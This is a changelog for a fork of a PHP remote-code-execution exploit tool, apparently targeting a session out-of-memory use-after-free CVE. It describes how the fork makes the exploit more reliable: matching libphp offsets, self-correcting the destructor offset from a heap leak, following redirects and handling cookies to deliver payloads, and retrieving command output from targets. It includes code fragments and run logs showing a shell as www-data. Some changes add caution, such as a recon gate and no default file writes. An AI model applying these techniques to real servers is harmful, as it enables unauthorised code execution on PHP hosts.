# Changes from upstream

Base: `JoasASantos/php2shell-exploit` @ main, plus the session-OOM parameters
from dimasma0305. Everything below is what this fork adds, with the measurement
that motivated it.

---

## 1. Never guess offsets — `lib/offset_db.py`

**Upstream** matched profiles in four tiers:

```python
# 1. exact version + OS + arch
# 2. exact version + arch
# 3. same major.minor, closest patch
# 4. any profile with matching arch        <-- last resort
```

**What broke.** A target ran PHP 8.4.15. The only near profile was 8.4.26, so
tier 4 selected it. The two builds differ by `0x1F400` in both symbols:

```txt
leaked zval_ptr_dtor = 0x78e4730d7420

- 0x65EB60 (8.4.26) -> libphp base 0x78e472a788c0   misalign 0x8c0   WRONG
- 0x63D420 (8.4.15) -> libphp base 0x78e472a9a000   misalign 0x0     RIGHT
```

The wrong base is not page-aligned, so B1 failed. The only signal was a warning
that was printed and ignored.

**Now.**

```python
if not php_version:
    return None
if best.php_version != php_version:
    return None
```

No version from recon means no profile. The operator must extract offsets from
the target's own binary or pass `--offsets-env`.

---

## 2. Self-correcting dtor offset — `lib/leak.py`, `exploit.py`

When the base is not page-aligned, the leaked dtor address already contains the
answer. Instead of discarding a valid 800 KB leak:

```python
implied_dtor = leaked_zval_ptr_dtor - (libphp_base & ~0xFFF)
return False, f"... implies dtor_offset=0x{implied_dtor:x}"
```

and in `exploit.py`:

```python
m = re.search(r"implies dtor_offset=0x([0-9a-f]+)", msg)
if m and int(m.group(1), 16) != dtor_off:
    dtor_off = int(m.group(1), 16)
    profile.zval_ptr_dtor = dtor_off
    continue        # retry with the corrected value
```

Result: `chain completed on try 1 candidate 1`.

---

## 3. Recon gate — `exploit.py`

**Upstream.**

```python
if not info.vulnerable and info.php_version:
    print("[!] target does not appear vulnerable (patched version)")
# ... execution continues anyway
```

Two problems: `and info.php_version` removes the gate exactly when recon is
least certain, and it only printed.

**Observed** on a stripped target:

```txt
Vulnerable   : no
PHP version hidden (X-Powered-By/Server stripped)
upload_progress appears disabled or not triggerable
...
[phase 3] EXPLOIT CHAIN
  [try 1/5] A1 ... [try 5/5] A1 ...   HTTP 302 each time
```

Five payloads at a target recon had already rejected.

**Now** the run stops after phase 0 with exit code 2, prints the reasons, and
requires `--force` to proceed.

---

## 4. No artefacts unless asked — `exploit.py`

**Upstream default** wrote two files to the target for every command:

```python
rce_cmd = f"{args.cmd} > /out/.p2s_result 2>&1; touch /out/.p2s_proof"
```

Fine in a Docker lab with `/out` bind-mounted. On a live target it writes into
someone else's filesystem for no reason.

**Now** the default is in-band (nothing written). `--save PATH` is opt-in, and
`--fallback-save PATH` retries with a file only if in-band produced nothing.

---

## 5. Honest reporting when in-band cannot return output

Measured on `php:8.4.15-apache`, single-worker prefork:

```txt
in-band : B2 response = 0 bytes, worker exits SIGSEGV after system() runs
--save  : output written to the file, worker survives
```

Upstream printed `all attempts exhausted`, which hides the fact that the
command already ran.

**Now.**

```txt
[!] command executed, but the B2 response was empty.
    On this build system() runs and the worker then
    exits SIGSEGV, so the output never reaches HTTP.
[+] chain reached A2/B2 - command invoked, output not retrievable in-band
```

`phase_exploit` tracks `executed_without_output` and returns a distinct message
instead of a bare failure.

---

## 6. Per-target results — `exploit.py`

**Upstream** wrote `.p2s_result` / `.p2s_proof` to one fixed directory, so a
second run silently overwrote the first and you could not tell which host
produced which output.

**Now** every successful run writes:

```
out/results/<host>_<port>/
├── cmd.txt
├── output.txt
└── meta.json     target, php_version, server, sapi, mpm,
                  profile, zif_system, zval_ptr_dtor, mode, timestamp
```

---

## 7. Proof files are run-scoped — `exploit.py`

A leftover `.p2s_result` from an earlier lab run was reported as proof of a live
RCE against an unrelated target. The file's mtime predated the run.

**Now** the check requires the file to be newer than the run start:

```python
if os.path.getmtime(rf) < run_started_at:
    continue
```

---

## 8. Reading files the target wrote — `exploit.py`

`--save /out/x` writes inside the container, but the tool read
`out_dir/.p2s_result`. Output was silently dropped even on success.

**Now** `_read_target_file()` resolves in order:

1. `/out/X` → `<out_dir>/X` and `$P2S_OUT_DIR/X` (bind mounts)
2. the path as-is on the host
3. `docker exec <container> cat X` for `--docker` / `$P2S_CONTAINER`
4. `docker exec cat` on any running container that has the file

with a short retry loop, because a bind mount needs a moment to reflect a write.

`_proof_path_for()` uses the same candidate list, so the proof check and the
read agree about where the file lives.

---

## 9. Redirect following and a cookie jar — `lib/transport.py`

**Upstream** had TLS and proxies but no 3xx handling:

```txt
A1: END-cleanup send_cookie OOM
    -> HTTP 302
[!] expected 500 (OOM), retrying
```

five times, never reaching the application.

**Now** `TransportConfig` carries `cookie`, `redirects`, `last_path`,
`pin_path`, `follow_redirects`, `inject_cookie`.

- `_raw_send(cfg, data, path)` follows 301/302/303/307/308
- `_absorb_cookies()` merges `Set-Cookie` into the jar
- `_resolve_location()` handles absolute, scheme-relative and relative targets
- a body-carrying POST keeps its body across 301/302/303 (browsers drop it; the
  exploit cannot, or the payload never arrives)

Verified against a `302 -> /landing.php` endpoint:

```txt
status      : 200
last_path   : /landing.php
cookie jar  : redir_test=1; PHPSESSID=c883f5cd...
body        : OK\nsid=c883f5cd...\nhits=1
```

### Three regressions this caused, and their fixes

See [docs/PATCHES.md](../docs/PATCHES.md) for the full write-up.

**9a. Cookie injection poisoned the chain.**
The jar was injected into every request. A1 absorbed the app's `PHPSESSID`, B1
then carried it on top of its own forged cookie, and B1's leak window *is* the
cookie bytes. Result: `no heap pointers in leak window`.

Fix: injection is gated on `cfg.inject_cookie`, set only by the entry-point
resolver. `resolve_entry` also strips any `PHPSESSID` it picked up.

**9b. `_raw_send` never returned the final response.**
The redirect loop ended without `return resp`, so control fell through into the
next function definition. Every chunked request returned nothing.

**9c. An eager entry-point probe shifted the heap.**
Resolving redirects before A1 added one GET between recon and the first
payload. On a single-worker prefork target that is enough to move the heap state
the chain depends on.

Fix: no eager probe. The hop is followed lazily during A1 and pinned afterwards.

---

## 10. New and updated profiles

`profiles/php-8.4.15-trixie-amd64.json` — offsets read from the image's own
`libphp.so`, status `verified` after a full end-to-end run
(`uid=33(www-data)`, try 1 candidate 1). Staging parameters are identical to
8.4.26, so the heap layout after A1 did not change between those builds.

Existing profiles: 8.4.25 (trixie amd64), 8.3.35 (bookworm amd64), 8.4.26
(trixie arm64) remain `unverified` — offsets extracted, chain not reproduced.

---

## 11. Lab harness — `lab/`

| File | Purpose |
|---|---|
| `lab_php_versi8415.sh` | PHP 8.4.15, single worker, :8088 |
| `lab_php_versi8426.sh` | PHP 8.4.26, :8089 |
| `verify_profiles.sh` | run both labs with no `--offsets-env` |
| `probe_target.sh` | non-destructive fingerprint of an unknown host |
| `show_results.sh` | print saved per-target results |
| `apache-prefork.conf` | forces a single worker |
| `www/index.php` | minimal session-enabled entry point |

---

## Known limitations

- **Redirect mid-chain still fails.** A1 OOMs on the first script, then the hop
  pins the rest of the chain to the second script, which never held the
  dangling session.
- **In-band output needs `--save`** on builds where the worker SIGSEGVs after
  `system()`.
- **Worker pinning is a guess.** `MaxRequestWorkers` is estimated from headers.
- **`--save` needs a writable path** on the target.
- **Profiles are per-build.**
- **EOL detection is not CVE detection.** PHP 7.x is flagged `vulnerable`
  because it is EOL, but this CVE does not exist there. Version gate pending.

---

## Upstream references

- Joas A. Santos (@c0d3cr4zy) — <https://github.com/JoasASantos/php2shell-exploit>
- dimasma0305 — <https://github.com/dimasma0305>
- 9bie / EDB-52704 — chunked `post_max_size` bypass, forged `zend_string`,
  `pDestructor = zif_system`
- PHP commit `3584a98bda` *"Avoid state corruption via bailout"* —
  GHSA-w8hw-w9fx-j79w (CVE-2026-109618),
  GHSA-6wmf-4rv5-p3rp (CVE-2026-109619); test `oom_unserialize_016.phpt`
